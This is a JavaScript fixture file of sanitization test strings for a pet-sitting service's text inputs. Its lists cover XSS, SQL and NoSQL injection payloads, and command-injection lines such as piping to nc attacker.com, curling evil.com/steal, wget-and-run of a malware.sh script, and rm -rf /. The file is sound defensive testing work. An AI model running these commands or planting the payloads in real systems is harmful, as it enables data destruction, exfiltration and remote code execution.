/**
 * COMPREHENSIVE SECURITY TEST STRINGS
 * Test these in your service name, service description, and custom animal inputs
 * Copy-paste each string to verify sanitization is working correctly
 */

console.log("=== COMPREHENSIVE SECURITY TEST STRINGS ===");

// Test 1: XSS Attacks (should be completely removed/sanitized)
const xssTests = [
  `<script>alert('XSS')</script>`,
  `<img src=x onerror=alert('IMG-XSS')>`,
  `<iframe src="javascript:alert('IFRAME-XSS')"></iframe>`,
  `<div onclick="alert('EVENT-XSS')">Click me</div>`,
  `<svg onload=alert('SVG-XSS')></svg>`,
  `<object data="data:text/html,<script>alert('OBJECT-XSS')</script>"></object>`,
  `<embed src="data:text/html,<script>alert('EMBED-XSS')</script>">`,
  `javascript:alert('JS-PROTOCOL')`,
  `vbscript:alert('VB-PROTOCOL')`,
  `data:text/html,<script>alert('DATA-URL')</script>`
];

// Test 2: SQL Injection (should be removed/sanitized)
const sqlTests = [
  `'; DROP TABLE users; --`,
  `" OR 1=1 --`,
  `UNION SELECT * FROM users`,
  `INSERT INTO users VALUES ('hacker', 'pass')`,
  `DELETE FROM users WHERE id=1`,
  `UPDATE users SET password='hacked'`,
  `SELECT * FROM information_schema.tables`,
  `'; EXEC xp_cmdshell('dir'); --`,
  `1' AND (SELECT COUNT(*) FROM users) > 0 --`,
  `admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users--`
];

// Test 3: Command Injection (should be removed/sanitized)
const commandTests = [
  `; rm -rf /`,
  `&& cat /etc/passwd`,
  `| nc attacker.com 4444`,
  `$(curl evil.com/steal)`,
  "`whoami`",
  `; wget http://evil.com/malware.sh; chmod +x malware.sh; ./malware.sh`,
  `|| ping -c 10 google.com`,
  `; sudo su -`,
  `&& format c:`,
  `../../../etc/passwd`
];

// Test 4: NoSQL Injection (should be removed/sanitized)
const nosqlTests = [
  `$where: function() { return true; }`,
  `$ne: null`,
  `{$regex: ".*"}`,
  `$or: [{}, {}]`,
  `$expr: { $function: { body: "return true" } }`,
  `$javascript: "return true"`,
  `{admin: {$exists: true}}`,
  `$where: "this.password.length > 0"`
];

// Test 5: Mixed Malicious + Legitimate Content (should extract legitimate)
const mixedTests = [
  `<script>alert('xss')</script>Professional pet sitting service`,
  `'; DROP TABLE users; -- Dog walking and overnight care`,
  `javascript:alert('hack'); Cat grooming and nail trimming`,
  `<img src=x onerror=alert('img')>Exotic animal care specialist`,
  `${""} rm -rf / && Bird feeding and cage cleaning service`,
  `$where: {admin: true}; Reptile habitat maintenance`,
  `<iframe>malicious</iframe>drop-in service for pets with overnight care and feeding`,
  `SELECT * FROM users; Pet transportation and vet visits`
];

// Test 6: Legitimate Business Content (should be preserved exactly)
const legitimateTests = [
  `Dog Walking Service`,
  `Professional Pet Sitting`,
  `Overnight Pet Care & Feeding`,
  `Cat Grooming & Nail Trimming`,
  `Exotic Animal Care Specialist`,
  `Bird Feeding & Cage Cleaning`,
  `Reptile Habitat Maintenance`,
  `Pet Transportation & Vet Visits`,
  `Aquarium Cleaning Service`,
  `Horse Grooming & Exercise`,
  `Small Animal Boarding`,
  `Emergency Pet Care`,
  `Pet Training & Behavior`,
  `Fish Tank Maintenance`,
  `Bunny Rabbit Care`,
  `Guinea Pig Sitting`,
  `Hamster & Gerbil Care`,
  `Ferret Play & Exercise`,
  `Chinchilla Dust Baths`,
  `Sugar Glider Bonding Time`
];

// Test 7: Edge Cases (various behaviors expected)
const edgeCases = [
  `   Leading spaces`,
  `Trailing spaces   `,
  `Multiple    consecutive    spaces`,
  `Special chars: @#$%^&*()`,
  `Numbers: 123-456-7890`,
  `Email-like: test@email.com`,
  `URL-like: https://website.com`,
  `Punctuation: Hello, world! How are you?`,
  `Quotes: "Pet care" and 'animal sitting'`,
  `Hyphens-and-dashes_and_underscores`,
  `Apostrophes in names like O'Connor's Pets`,
  `Mixed Case: PeT cArE sErViCe`,
  `Very Long Service Name That Exceeds Normal Length Limits To Test Truncation Behavior`,
  ``, // Empty string
  `   `, // Only spaces
  `\n\r\t`, // Whitespace characters
];

// Test 8: Unicode and International (should handle gracefully)
const unicodeTests = [
  `Café Pet Services`,
  `Naïve Animal Care`,
  `Piñata Pet Parties`,
  `Résumé for Pet Sitter`,
  `Zürich Pet Transport`,
  `🐕 Dog Walking 🐕`,
  `🐱 Cat Care Service 🐱`,
  `Pet Care™ & Training®`,
  `Señor Pet Services`,
  `München Animal Hospital`
];

// Test 9: Boundary Testing (length and character limits)
const boundaryTests = [
  `A`, // Single character
  `AB`, // Two characters  
  `ABC`, // Three characters (minimum for service name)
  `A`.repeat(35), // Max service name length
  `A`.repeat(36), // Over max service name length
  `A`.repeat(300), // Max description length
  `A`.repeat(301), // Over max description length
  `A`.repeat(1000), // Very long input
];

// EXPECTED RESULTS GUIDE:
console.log(`
=== EXPECTED RESULTS GUIDE ===

XSS Tests: Should remove all HTML tags, scripts, and JavaScript
SQL Tests: Should remove SQL keywords and injection patterns
Command Tests: Should remove shell commands and dangerous characters
NoSQL Tests: Should remove MongoDB operators and injection patterns
Mixed Tests: Should extract only the legitimate service description
Legitimate Tests: Should preserve exactly as typed (with normal space cleanup)
Edge Cases: Should handle spaces, punctuation, and special characters appropriately
Unicode Tests: Should preserve international characters or handle gracefully
Boundary Tests: Should respect length limits and handle edge cases

=== QUICK COPY-PASTE TESTS ===

1. Basic XSS: <script>alert('test')</script>
2. SQL Injection: '; DROP TABLE users; --
3. Command Injection: ; rm -rf /
4. Mixed Content: <script>alert('xss')</script>drop-in service for pets with overnight care and feeding
5. Legitimate: Professional Dog Walking Service
6. Spaces Test: Test   Multiple    Spaces   
7. Special Chars: Pet Care & Training Service!
8. Length Test: ${`Very Long Service Name `.repeat(5)}

=== WHAT TO LOOK FOR ===

✅ Spaces preserved during typing
✅ Malicious content removed
✅ Legitimate text extracted from mixed content
✅ Special characters handled appropriately
✅ Length limits respected
✅ No crashes or errors
❌ Any malicious content that gets through
❌ Legitimate content being removed incorrectly
❌ Spaces being removed during normal typing
`);

// Export for use in other files
module.exports = {
  xssTests,
  sqlTests,
  commandTests,
  nosqlTests,
  mixedTests,
  legitimateTests,
  edgeCases,
  unicodeTests,
  boundaryTests
}; 